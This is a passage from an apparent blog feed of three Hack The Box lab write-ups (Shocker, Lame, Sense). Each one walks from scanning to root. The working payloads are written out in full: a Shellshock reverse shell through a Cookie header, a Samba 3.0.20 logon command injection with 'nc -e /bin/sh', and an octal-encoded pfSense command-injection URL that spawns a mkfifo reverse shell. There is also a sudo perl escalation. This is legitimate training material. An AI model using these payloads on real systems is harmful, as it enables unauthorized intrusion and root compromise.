<h2 id="0x1-enumeration">0x1 Enumeration</h2>
<h3 id="nmaprustscan">Nmap/Rustscan</h3>
<p>Lets start to enumerate the machine first, using this command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rustscan -a 10.10.10.60 --ulimit <span style="color:#ae81ff">10000</span> -- -sV -sC -A -T5

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Site doesn<span style="color:#e6db74">&#39;&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   <span style="color:#ae81ff">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk

</code></pre></div><p>Open port just http server and ssh.</p>
<h3 id="site-enumeration">Site Enumeration</h3>
<p>Visit the web and nothing there include source code.</p>
<p><img src="/img/htbshocker1.png" alt=""></p>
<p>Even bruteforcing directory, not found usefull result.</p>
<p>After a while, i try think about the machine name, shocker like bug shellshock in <code>cgi-bin</code> script.
Try to get <a href="http://shocker.htb/cgi-bin/">http://shocker.htb/cgi-bin/</a> but get forbidden</p>
<p><img src="img/htbshocker2.png" alt=""></p>
<p>Knowing this, try to bruteforce that folder :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://shocker.htb/cgi-bin/ -w ~/wordlist/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">125</span> -x cgi,pl,sh

<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.56/cgi-bin/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">125</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /home/dito/wordlist/directory-list-2.3-medium.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              cgi,pl,sh
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/10/26 19:25:01 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/user.sh              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 118<span style="color:#f92672">]</span>

</code></pre></div><p>Found interesting script <code>user.sh</code></p>
<p><img src="/img/htbshocker3.png" alt=""></p>
<h2 id="0x1-exploit-to-user-shell">0x1 Exploit to User Shell</h2>
<p>Simple curl to make reverse shell :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -H <span style="color:#e6db74">&#39;Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.18/9000 0&gt;&amp;1&#39;</span> http://shocker.htb/cgi-bin/user.sh

nc -lnvp <span style="color:#ae81ff">9000</span>
Listening on 0.0.0.0 <span style="color:#ae81ff">9000</span>
Connection received on 10.10.10.56 <span style="color:#ae81ff">36064</span>
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 

</code></pre></div><p>We got user <code>shelly</code> and flag user.</p>
<h2 id="0x2-exploit-to-root-shell">0x2 Exploit to Root Shell</h2>
<p>I use linpeas linux script, and found interesing sudoers</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
<span style="color:#75715e">#local machine</span>
$ python3 -m http.server <span style="color:#ae81ff">8000</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
10.10.10.56 - - <span style="color:#f92672">[</span>26/Oct/2021 19:30:39<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /linpeas.sh HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -

<span style="color:#75715e">#server machine</span>
$ shelly@Shocker:/home/shelly$ cd /tmp
cd /tmp
$ shelly@Shocker:/tmp$ wget http://10.10.14.18:8000/linpeas.sh
--2021-10-26 08:30:24--  http://10.10.14.18:8000/linpeas.sh
Connecting to 10.10.14.18:8000...

connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">326636</span> <span style="color:#f92672">(</span>319K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-sh<span style="color:#f92672">]</span>
Saving to: <span style="color:#e6db74">&#39;linpeas.sh&#39;</span>

linpeas.sh          100%<span style="color:#f92672">[===================</span>&gt;<span style="color:#f92672">]</span> 318.98K   305KB/s    in 1.0s

2021-10-26 08:30:41 <span style="color:#f92672">(</span><span style="color:#ae81ff">305</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;linpeas.sh&#39;</span> saved <span style="color:#f92672">[</span>326636/326636<span style="color:#f92672">]</span>

$ shelly@Shocker:/tmp$
$ shelly@Shocker:/tmp$ chmod +x linpeas.sh
$ shelly@Shocker:/tmp$ ./linpeas.sh

User shelly may run the following commands on Shocker:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl

</code></pre></div><p>So user shelly can run as user root on perl binary, using gtfobin <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a> we can get escalation to root</p>
<pre tabindex="0"><code>$ shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec &quot;/bin/sh&quot;;'
sudo /usr/bin/perl -e 'exec &quot;/bin/sh&quot;;'
ls
user.sh
whoami
root
</code></pre>]]></content>
        </item>
        
        <item>
            <title>Recap HTB: Lame</title>
            <link>/posts/recap-htb-lame/</link>
            <pubDate>Tue, 26 Oct 2021 18:20:32 +0700</pubDate>
            
            <guid>/posts/recap-htb-lame/</guid>
            <description>0x0 Intro    Name Values     Machine Name Lame   Difficulty Easy   Retired True   Release Date 1686 Days   Machine IP 10.10.10.3    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
$ rustscan -a 10.10.10.3 --ulimit 10000 -- -sV -sC -A -T5 -Pn PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 2.</description>
            <content type="html"><![CDATA[<h2 id="0x0-intro">0x0 Intro</h2>
<table>
<thead>
<tr>
<th>Name</th>
<th style="text-align:right">Values</th>
</tr>
</thead>
<tbody>
<tr>
<td>Machine Name</td>
<td style="text-align:right">Lame</td>
</tr>
<tr>
<td>Difficulty</td>
<td style="text-align:right">Easy</td>
</tr>
<tr>
<td>Retired</td>
<td style="text-align:right">True</td>
</tr>
<tr>
<td>Release Date</td>
<td style="text-align:right">1686 Days</td>
</tr>
<tr>
<td>Machine IP</td>
<td style="text-align:right">10.10.10.3</td>
</tr>
</tbody>
</table>
<h2 id="0x1-enumeration">0x1 Enumeration</h2>
<h3 id="nmaprustscan">Nmap/Rustscan</h3>
<p>Lets start to enumerate the machine first, using this command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rustscan -a 10.10.10.3 --ulimit <span style="color:#ae81ff">10000</span> -- -sV -sC -A -T5 -Pn

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
| ...
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>So open port on this machine are ftp, ssh, and smb. Try to enumerate more.</p>
<p>Try to access FTP it success login using anonymous, but nothing there and cant list other directory</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ftp 10.10.10.3

Connected to 10.10.10.3.
<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 2.3.4<span style="color:#f92672">)</span>
Name <span style="color:#f92672">(</span>10.10.10.3:dito<span style="color:#f92672">)</span>: anonymous
<span style="color:#ae81ff">331</span> Please specify the password.
Password:
<span style="color:#ae81ff">230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">65534</span>        <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2010</span> .
drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">65534</span>        <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2010</span> ..
<span style="color:#ae81ff">226</span> Directory send OK.

</code></pre></div><p>Enumerate on Samba :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.10.3
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED

$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.10.3 --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
        ADMIN$          IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>

$ smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.3<span style="color:#ae81ff">\\</span>tmp --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
Anonymous login successful
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> 
</code></pre></div><p>But we got information it using samba <code>3.0.20-Debian</code>. In that version there is vulnerabiliry command injection.</p>
<h2 id="0x2-exploit">0x2 Exploit</h2>
<p>Try it :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.3<span style="color:#ae81ff">\\</span>tmp --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
Anonymous login successful
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> logon <span style="color:#e6db74">&#34;/=`nohup nc -e /bin/sh 10.10.14.18 9000`&#34;</span>
Password:
session setup failed: NT_STATUS_IO_TIMEOUT
smb: <span style="color:#ae81ff">\&gt;</span>

$ nc -lnvp <span style="color:#ae81ff">9000</span>
Listening on 0.0.0.0 <span style="color:#ae81ff">9000</span>
Connection received on 10.10.10.3 <span style="color:#ae81ff">51520</span>
id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
whoami
root
</code></pre></div><p>Instanly get root :D</p>
]]></content>
        </item>
        
        <item>
            <title>Recap HTB: Sense</title>
            <link>/posts/recap-htb-sense/</link>
            <pubDate>Mon, 25 Oct 2021 20:27:53 +0700</pubDate>
            
            <guid>/posts/recap-htb-sense/</guid>
            <description>0x0 Intro    Name Values     Machine Name Sense   Difficulty Easy   Retired True   Release Date 1464 Days   Machine IP 10.10.10.60    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
$ rustscan -a 10.10.10.60 --ulimit 10000 -- -sV -sC -A -T5 Open 10.10.10.60:80 Open 10.10.10.60:443 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack lighttpd 1.</description>
            <content type="html"><![CDATA[<h2 id="0x0-intro">0x0 Intro</h2>
<table>
<thead>
<tr>
<th>Name</th>
<th style="text-align:right">Values</th>
</tr>
</thead>
<tbody>
<tr>
<td>Machine Name</td>
<td style="text-align:right">Sense</td>
</tr>
<tr>
<td>Difficulty</td>
<td style="text-align:right">Easy</td>
</tr>
<tr>
<td>Retired</td>
<td style="text-align:right">True</td>
</tr>
<tr>
<td>Release Date</td>
<td style="text-align:right">1464 Days</td>
</tr>
<tr>
<td>Machine IP</td>
<td style="text-align:right">10.10.10.60</td>
</tr>
</tbody>
</table>
<h2 id="0x1-enumeration">0x1 Enumeration</h2>
<h3 id="nmaprustscan">Nmap/Rustscan</h3>
<p>Lets start to enumerate the machine first, using this command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rustscan -a 10.10.10.60 --ulimit <span style="color:#ae81ff">10000</span> -- -sV -sC -A -T5

Open 10.10.10.60:80
Open 10.10.10.60:443

PORT    STATE SERVICE    REASON  VERSION
80/tcp  open  http       syn-ack lighttpd 1.4.35
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
443/tcp open  ssl/https? syn-ack
|_ssl-date: TLS randomness does not represent time

</code></pre></div><p>Looking for the result, open port just 80 and 443 it mean web server http and https.</p>
<h3 id="site">Site</h3>
<p>The page is just a login page from pfsense :</p>
<p><img src="/img/htbsense01.png" alt=""></p>
<p>Lets go to try default credential for login.</p>
<p>found this in pfsense document :</p>
<pre tabindex="0"><code>Default Username and Password
The default credentials for a pfSense® software installation are:

Username : admin

Password : pfsense
</code></pre><p>But not work :(</p>
<h3 id="directory-bruteforce">Directory Bruteforce</h3>
<p>Lets try to enumerate with other options, i try to bruteforce directory using gobuster :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u https://10.10.10.60/ -k -w ~/wordlist/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">125</span> -x txt,php,html

<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://10.10.10.60/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">125</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /home/dito/wordlist/directory-list-2.3-medium.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,php,html
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/10/25 21:20:34 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/themes               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/themes/<span style="color:#f92672">]</span>
/stats.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 329<span style="color:#f92672">]</span>
/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/css/<span style="color:#f92672">]</span>
/help.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/includes/<span style="color:#f92672">]</span>
/edit.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
/system.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
/license.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6692<span style="color:#f92672">]</span>
/status.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
/javascript           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/javascript/<span style="color:#f92672">]</span>
/changelog.txt        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 271<span style="color:#f92672">]</span>
/classes              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/classes/<span style="color:#f92672">]</span>
/exec.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
/widgets              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/widgets/<span style="color:#f92672">]</span>
/graph.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
/tree                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/tree/<span style="color:#f92672">]</span>
/wizard.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
/shortcuts            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/shortcuts/<span style="color:#f92672">]</span>
/pkg.php              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6688<span style="color:#f92672">]</span>
/installer            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/installer/<span style="color:#f92672">]</span>
/wizards              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/wizards/<span style="color:#f92672">]</span>
/xmlrpc.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 384<span style="color:#f92672">]</span>
/interfaces.php       <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6695<span style="color:#f92672">]</span>
/csrf                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/csrf/<span style="color:#f92672">]</span>
/system-users.txt     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 106<span style="color:#f92672">]</span>
...
</code></pre></div><p>First time scaning this, i&rsquo;m stuck because iam using http and always redirect it to https, iam not aware of this and set negative status code 302 :kek: i got nothing for result, after realize that, i change to https and use <code>-k</code> to disable cert check.</p>
<p>i found interesting file <code>system-users.txt</code>, the other file i think is source from pfsense itself.
inside that file :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">####Support ticket###

Please create the following user


username: Rohit
password: company defaults
</code></pre></div><p>Knowing this lets try to login with username above and use default password from pfsense.
its success login :D</p>
<p><img src="/img/htbsense02.png" alt=""></p>
<h2 id="0x2-shell-as-root">0x2 Shell as Root</h2>
<h3 id="exploit">Exploit</h3>
<p>pfsense version that installed on machine is :</p>
<pre tabindex="0"><code>2.1.3-RELEASE (amd64)
built on Thu May 01 15:52:13 EDT 2014
FreeBSD 8.3-RELEASE-p16
</code></pre><p>Searching in exploit-db.com url : <a href="https://www.exploit-db.com/exploits/43560,">https://www.exploit-db.com/exploits/43560,</a> there is exploit <code>pfSense &lt; 2.1.4 - 'status_rrd_graph_img.php' Command Injection</code>.</p>
<p>Reading that exploit, we can simply craft payload to RCE in single url :</p>
<pre tabindex="0"><code>&quot;https://&quot; + rhost + &quot;/status_rrd_graph_img.php?database=queues;&quot;+&quot;printf+&quot; + &quot;'&quot; + payload + &quot;'|sh&quot;
</code></pre><p>So i test to craft payload with simple nc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://10.10.10.60/status_rrd_graph_img.php?database<span style="color:#f92672">=</span>queues;printf+%27nc%2010.10.14.18%209000%27|sh

nc -lnvp <span style="color:#ae81ff">9000</span>
Listening on 0.0.0.0 <span style="color:#ae81ff">9000</span>
Connection received on 10.10.10.60 <span style="color:#ae81ff">25723</span>
</code></pre></div><p>Continue to make RCE payload :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://10.10.10.60/status_rrd_graph_img.php?database<span style="color:#f92672">=</span>queues;printf+%27rm%20-f%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&amp;1|nc%2010.10.14.18%209000%20%3E/tmp/f%27|sh
</code></pre></div><p>but not work :(</p>
<p>reading exploit on exploit db again, it need to craft to payload in octal</p>
<pre tabindex="0"><code>payload = ''
# encode payload in octal
for char in command:
	payload += (&quot;\\&quot; + oct(ord(char)).lstrip(&quot;0o&quot;))

# i try this on local python to get right payload
&gt;&gt;&gt; payload = ''
&gt;&gt;&gt; command = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 9000 &gt; /tmp/f'
&gt;&gt;&gt; for char in command:
...     payload += (&quot;\\&quot; + oct(ord(char)).lstrip(&quot;0o&quot;))
...
&gt;&gt;&gt; payload
... \162\155\40\55\146\40\57\164\155\160\57\146\73\155\153\146\151\146\157\40\57\164\155\160\57\146\73\143\141\164\40\57\164\155\160\57\146\174\57\142\151\156\57\163\150\40\55\151\40\62\76\46\61\174\156\143\40\61\60\56\61\60\56\61\64\56\61\70\40\71\60\60\60\40\76\40\57\164\155\160\57\146

then add it into url : 
https://10.10.10.60/status_rrd_graph_img.php?database=queues;printf+%27\162\155\40\55\146\40\57\164\155\160\57\146\73\155\153\146\151\146\157\40\57\164\155\160\57\146\73\143\141\164\40\57\164\155\160\57\146\174\57\142\151\156\57\163\150\40\55\151\40\62\76\46\61\174\156\143\40\61\60\56\61\60\56\61\64\56\61\70\40\71\60\60\60\40\76\40\57\164\155\160\57\146%27|sh|echo

$ nc -lnvp 9000
Listening on 0.0.0.0 9000
Connection received on 10.10.10.60 59899
sh: can't access tty; job control turned off
# ls
GW_WAN-quality.rrd
WAN_DHCP-quality.rrd
ipsec-packets.rrd
ipsec-traffic.rrd
system-mbuf.rrd
system-memory.rrd
system-processor.rrd
system-states.rrd
updaterrd.sh
wan-packets.rrd
wan-traffic.rrd
# whoami
root
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
</code></pre><p>Rooted :D :yay:</p>
]]></content>
        </item>
        
        <item>
